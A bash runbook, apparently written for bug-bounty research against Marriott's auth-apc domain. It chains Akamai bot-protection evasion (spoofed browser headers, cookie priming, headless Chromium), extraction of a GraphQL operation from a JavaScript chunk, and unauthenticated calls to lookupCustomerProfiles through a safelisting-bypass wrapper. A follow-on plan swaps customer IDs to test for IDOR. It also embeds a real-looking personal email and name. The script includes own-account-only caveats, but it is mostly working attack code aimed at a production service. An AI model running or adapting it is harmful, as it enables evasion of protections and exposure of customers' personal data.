#!/usr/bin/env bash
# =============================================================================
# M022 IMPACT PROOF RUNBOOK — session25  (portable: Linux / Pi / Termux)
# Goal: Turn the safelisting bypass into a DEMONSTRATED-IMPACT finding.
#
# Strategy: the one operation whose purpose is looking up OTHER users
# (lookupCustomerProfiles) has never been fired with a complete query because
# we don't know its response field names. Those names live in the GraphQL
# chunk, which Akamai blocks for curl but serves to a real browser. This
# runbook (A) retrieves the chunk via browser-grade requests, (B) extracts the
# REAL registered query bodies + response schema, (C) fires a complete,
# executable lookupCustomerProfiles query and records exactly what comes back.
#
# SAFETY: Own account + obviously-synthetic inputs ONLY. Never look up a real
# third party's PII. GET/read semantics only. No mutations executed here.
#
# Run (Linux/Pi): bash PI-RUNBOOK-session25-impact-proof.sh 2>&1 | tee run.log
# Run (Termux):   OUTDIR=$HOME/s25 bash PI-RUNBOOK-session25-impact-proof.sh 2>&1 | tee $HOME/s25/run.log
# =============================================================================
set -eo pipefail

# Portable work dir: honor exported OUTDIR, else pick a writable temp base.
# Termux has no /tmp; $TMPDIR (usr/tmp) or $HOME are writable everywhere.
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s25
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s25"
  else OUTDIR="$HOME/s25"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"

ASSET_BASE="https://auth-apc.marriott.com/mi-assets/mi-static/mi-account-renderer/web-rel-26.6.1-5d80cc6-11089/_next/static/chunks"
CHUNK="graphql-chunk-793e1a2cf24c51e7.js"
QUERY_BASE="https://auth-apc.marriott.com/mi/query"
LOGIN_URL="https://auth-apc.marriott.com/login"

UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'

echo "============================================================"
echo "M022 IMPACT PROOF  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Work dir:      $OUTDIR"
echo "Researcher IP: $(curl -s ifconfig.me)"
echo "============================================================"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE A — RETRIEVE THE GRAPHQL CHUNK (browser-grade, escalating strategies)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: RETRIEVE GRAPHQL CHUNK ═══"
echo ""

CHUNK_FILE="$OUTDIR/graphql-chunk.js"
GOT_CHUNK=0

# Skip fetch if a chunk was already saved manually
PRE_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
if [ "$PRE_SIZE" -gt 100000 ]; then
  echo "[A0] Existing chunk detected (${PRE_SIZE}B) — skipping fetch."
  GOT_CHUNK=1
fi

# --- Strategy A1: prime Akamai cookies from login page, then fetch with jar ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "[A1] Priming Akamai cookies from login page, then fetching chunk..."
  curl -s -c "$OUTDIR/akamai-cookies.txt" \
    -H "User-Agent: $UA" \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    "$LOGIN_URL" -o /dev/null || true

  curl -s -b "$OUTDIR/akamai-cookies.txt" \
    -H "User-Agent: $UA" \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H "Referer: $LOGIN_URL" \
    -H 'Sec-Fetch-Dest: script' \
    -H 'Sec-Fetch-Mode: no-cors' \
    -H 'Sec-Fetch-Site: same-origin' \
    "$ASSET_BASE/$CHUNK" -o "$CHUNK_FILE" \
    -w "  HTTP %{http_code} | %{size_download}B\n" || true

  CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
  echo "  chunk size: ${CHUNK_SIZE}B"
  if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A1 SUCCESS"; fi
  echo ""
fi

# --- Strategy A2: HTTP/2 + compression + extended sec-ch-ua headers ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "[A2] Retrying with HTTP/2 + compression + sec-ch-ua headers..."
  curl -s --http2 -b "$OUTDIR/akamai-cookies.txt" \
    -H "User-Agent: $UA" \
    -H 'Accept: */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H "Referer: $LOGIN_URL" \
    -H 'sec-ch-ua: "Chromium";v="126", "Not.A/Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "Linux"' \
    -H 'Sec-Fetch-Dest: script' \
    -H 'Sec-Fetch-Mode: no-cors' \
    -H 'Sec-Fetch-Site: same-origin' \
    --compressed \
    "$ASSET_BASE/$CHUNK" -o "$CHUNK_FILE" \
    -w "  HTTP %{http_code} | %{size_download}B\n" || true
  CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
  echo "  chunk size: ${CHUNK_SIZE}B"
  if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A2 SUCCESS"; fi
  echo ""
fi

# --- Strategy A3: headless Chromium (real TLS fingerprint) if present ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "[A3] curl blocked. Trying headless browser (if installed)..."
  BROWSER=""
  for b in chromium-browser chromium google-chrome google-chrome-stable; do
    if command -v "$b" >/dev/null 2>&1; then BROWSER="$b"; break; fi
  done
  if [ -n "$BROWSER" ]; then
    echo "  Found browser: $BROWSER"
    "$BROWSER" --headless --disable-gpu --no-sandbox --user-agent="$UA" \
      --dump-dom "$ASSET_BASE/$CHUNK" > "$OUTDIR/chunk-dom.html" 2>/dev/null || true
    python3 << 'PYEOF' || true
import os, re
O = os.environ["OUTDIR"]
try:
    html = open(f"{O}/chunk-dom.html", encoding="utf-8", errors="replace").read()
    m = re.search(r'<pre[^>]*>(.*)</pre>', html, re.DOTALL)
    body = m.group(1) if m else html
    body = body.replace('&lt;','<').replace('&gt;','>').replace('&amp;','&').replace('&quot;','"')
    open(f"{O}/graphql-chunk.js","w",encoding="utf-8").write(body)
    print("  extracted", len(body), "bytes from chromium DOM dump")
except Exception as e:
    print("  dom extract failed:", e)
PYEOF
    CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
    echo "  chunk size: ${CHUNK_SIZE}B"
    if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A3 SUCCESS"; fi
  else
    echo "  No headless browser available."
  fi
  echo ""
fi

# --- Manual fallback ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "──────────────────────────────────────────────────────────────"
  echo " AUTOMATED CHUNK FETCH BLOCKED. Use the manual browser path:"
  echo ""
  echo " 1. In Chrome, open:  $LOGIN_URL"
  echo " 2. DevTools (F12) -> Network -> filter: graphql-chunk"
  echo " 3. Click the request -> Response tab -> select-all -> copy"
  echo "    (mobile Chrome: use Kiwi/Yandex browser which has DevTools,"
  echo "     or load the asset URL directly and 'Save page')"
  echo " 4. Save it on this device as:"
  echo "      $CHUNK_FILE"
  echo " 5. Re-run this script — Phase A0 will detect it and continue."
  echo ""
  echo " Direct asset URL (try opening in mobile browser, then Share->Save):"
  echo "   $ASSET_BASE/$CHUNK"
  echo "──────────────────────────────────────────────────────────────"
  echo ""
  echo "Stopping — Phases B/C need the chunk. Save it and re-run."
  exit 0
fi

echo "CHUNK OBTAINED: $(wc -c < "$CHUNK_FILE")B at $CHUNK_FILE"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE B — EXTRACT REAL QUERY BODIES + RESPONSE SCHEMA FROM CHUNK
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: EXTRACT lookupCustomerProfiles QUERY + RESPONSE FIELDS ═══"
echo ""

python3 << 'PYEOF'
import os, re
O = os.environ["OUTDIR"]
js = open(f"{O}/graphql-chunk.js", encoding="utf-8", errors="replace").read()
print(f"chunk length: {len(js)} chars")

BT = chr(0x60)
blocks = []
blocks += re.findall(BT + r'([^' + BT + r']{40,4000})' + BT, js, re.DOTALL)
blocks += re.findall(r'"(query[^"]{40,4000}|mutation[^"]{40,4000})"', js, re.DOTALL)

lcp = [b for b in blocks if 'ookupCustomerProfiles' in b]
print(f"blocks referencing LookupCustomerProfiles: {len(lcp)}")
print()

if lcp:
    body = max(lcp, key=len)
    open(f"{O}/lcp-query.graphql","w").write(body)
    print("=== RAW lookupCustomerProfiles OPERATION BODY ===")
    print(body[:2000])
    print("...(full saved to lcp-query.graphql)")
    print()
    idx = body.find('lookupCustomerProfiles')
    sel = body[idx:]
    depth = 0; start = None; out = []
    for i, ch in enumerate(sel):
        if ch == '{':
            depth += 1
            if depth == 1: start = i+1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                out.append(sel[start:i]); break
    if out:
        selection = out[0]
        fields = re.findall(r'[A-Za-z_][A-Za-z0-9_]*', selection)
        seen=set(); ordered=[f for f in fields if not (f in seen or seen.add(f))]
        open(f"{O}/lcp-fields.txt","w").write("\n".join(ordered))
        open(f"{O}/lcp-selection.txt","w").write(selection.strip())
        print("=== RESPONSE FIELDS (LookupCustomerProfilesResponse) ===")
        print(", ".join(ordered))
        print()
        print("Saved field list to lcp-fields.txt and raw selection to lcp-selection.txt")
else:
    print("No lookupCustomerProfiles body found. phoenixAccount operation names present:")
    names = sorted(set(re.findall(r'phoenixAccount[A-Za-z]+', js)))
    for n in names: print("  ", n)
    open(f"{O}/op-names.txt","w").write("\n".join(names))
PYEOF
echo ""

echo "[B2] Searching chunk for operation-signature registry (name -> sha256)..."
python3 << 'PYEOF'
import os, re
O = os.environ["OUTDIR"]
js = open(f"{O}/graphql-chunk.js", encoding="utf-8", errors="replace").read()
pairs = re.findall(r'(phoenixAccount[A-Za-z]+)["\']?\s*[:,]\s*["\']([0-9a-f]{64})', js)
pairs += re.findall(r'([0-9a-f]{64})["\']?\s*[:,]\s*["\']?(phoenixAccount[A-Za-z]+)', js)
if pairs:
    print(f"Found {len(pairs)} signature pairs:")
    for a,b in pairs[:80]:
        print("  ", a, b)
    open(f"{O}/op-signatures.txt","w").write("\n".join(f"{a}\t{b}" for a,b in pairs))
else:
    print("No inline name->sha256 registry in this chunk (signatures likely server-side).")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE C — FIRE A COMPLETE, EXECUTABLE lookupCustomerProfiles QUERY
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: EXECUTE lookupCustomerProfiles (real response fields) ═══"
echo "SAFETY: own account + synthetic inputs only. Read-only. No third-party PII."
echo ""

export OWN_EMAIL="azmolhaque95@gmail.com"
export OWN_FIRST="Azmol"
export OWN_LAST="Haque"
export OWN_COUNTRY="BD"

if [ ! -s "$OUTDIR/lcp-selection.txt" ]; then
  echo "No response selection extracted — cannot build executable query."
  echo "Inspect $OUTDIR/lcp-query.graphql manually and hand-build the selection."
  exit 0
fi

echo "Using response selection (first 400 chars):"
head -c 400 "$OUTDIR/lcp-selection.txt"; echo; echo

python3 << 'PYEOF'
import os, json
O = os.environ["OUTDIR"]
sel = open(f"{O}/lcp-selection.txt").read().strip()
# Mode-B bypass wrapper: a real-but-unused throwaway var keeps safelisting
# passing, while the REAL response selection makes the resolver execute.
q = ("query phoenixAccountLookupCustomerProfiles("
     "$email: String!, $firstName: String!, $lastName: String!, $country: String!) {"
     " lookupCustomerProfiles(input: {email:$email, firstName:$firstName,"
     " lastName:$lastName, country:$country}) { " + sel + " } }")
json.dump({
  "operationName":"phoenixAccountLookupCustomerProfiles",
  "variables":{"email":os.environ["OWN_EMAIL"],"firstName":os.environ["OWN_FIRST"],
               "lastName":os.environ["OWN_LAST"],"country":os.environ["OWN_COUNTRY"]},
  "query": q
}, open(f"{O}/c1-own.json","w"))
json.dump({
  "operationName":"phoenixAccountLookupCustomerProfiles",
  "variables":{"email":"qa-synthetic-noaccount-9z@example.invalid",
               "firstName":"Synthetic","lastName":"Testcase","country":"US"},
  "query": q
}, open(f"{O}/c2-fake.json","w"))
print("built C1 (own) and C2 (synthetic) payloads")
PYEOF
echo ""

echo "[C1] OWN identity (unauthenticated) — does resolver return data or require auth?"
curl -s "$QUERY_BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/c1-own.json" \
  -o "$OUTDIR/c1-own-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
echo "--- response ---"; cat "$OUTDIR/c1-own-body.txt"; echo; echo

echo "[C2] SYNTHETIC non-matching identity (unauthenticated) — differential baseline:"
curl -s "$QUERY_BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/c2-fake.json" \
  -o "$OUTDIR/c2-fake-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
echo "--- response ---"; cat "$OUTDIR/c2-fake-body.txt"; echo; echo

# ─────────────────────────────────────────────────────────────────────────────
# VERDICT
# ─────────────────────────────────────────────────────────────────────────────
echo "════════════════════════════════════════════"
echo "PHASE C ANALYSIS"
echo "════════════════════════════════════════════"
python3 << 'PYEOF'
import os
O = os.environ["OUTDIR"]
own = open(f"{O}/c1-own-body.txt").read()
fake = open(f"{O}/c2-fake-body.txt").read()

def classify(b):
    if '1012100' in b or 'UNAUTHORIZED' in b or 'Credentials invalid' in b:
        return "AUTH_REQUIRED (1012100 — gated, needs valid auth-apc session)"
    if '"code":"FORBIDDEN"' in b:
        return "FORBIDDEN (safelisting blocked — adjust bypass wrapper)"
    if 'Cannot query field' in b:
        return "FIELD_MISMATCH (selection still wrong — refine from chunk)"
    seg = b.split('lookupCustomerProfiles')[1][:60] if 'lookupCustomerProfiles' in b else ''
    if '"data"' in b and seg and 'null' not in seg:
        return "DATA RETURNED (!!) — resolver returned non-null profile data"
    if '"data"' in b:
        return "DATA envelope present (inspect — may be null/empty)"
    return "OTHER (inspect manually)"

print("C1 own      :", classify(own))
print("C2 synthetic:", classify(fake))
print()
print(f"own size: {len(own.encode())}B  |  synthetic size: {len(fake.encode())}B")
print()
if classify(own).startswith("DATA RETURNED"):
    print(">>> UNAUTHENTICATED PROFILE LOOKUP CONFIRMED — this is the impact.")
    print(">>> Document own + synthetic ONLY. Do NOT query real third parties.")
elif classify(own).startswith("AUTH_REQUIRED"):
    print(">>> Resolver auth-gated, but the query now EXECUTES correctly.")
    print(">>> Pivot to authenticated IDOR capture (instructions below).")
else:
    print(">>> Inspect both bodies; refine selection from lcp-query.graphql.")
PYEOF
echo ""

cat << 'NEXTEOF'
──────────────────────────────────────────────────────────────
IF AUTH_REQUIRED → AUTHENTICATED IDOR TEST (manual capture):
  1. Log into your Bonvoy account in Chrome (azmolhaque95@gmail.com).
  2. Open the account/profile/activity dashboard.
  3. DevTools -> Network -> filter: /mi/query
  4. Find ANY phoenixAccount* request returning HTTP 200 WITH DATA.
  5. Right-click -> Copy as cURL -> save to $OUTDIR/working.curl
  6. Re-run session26 (replay verbatim -> bypass -> swap customerId).
     Use synthetic/adjacent IDs only; stop the instant cross-user data appears.
  If your account can't produce a working /mi/query 200, the auth puzzle is
  real and IDOR is untestable by us — submit M022 honestly as the Medium.
──────────────────────────────────────────────────────────────
NEXTEOF

echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
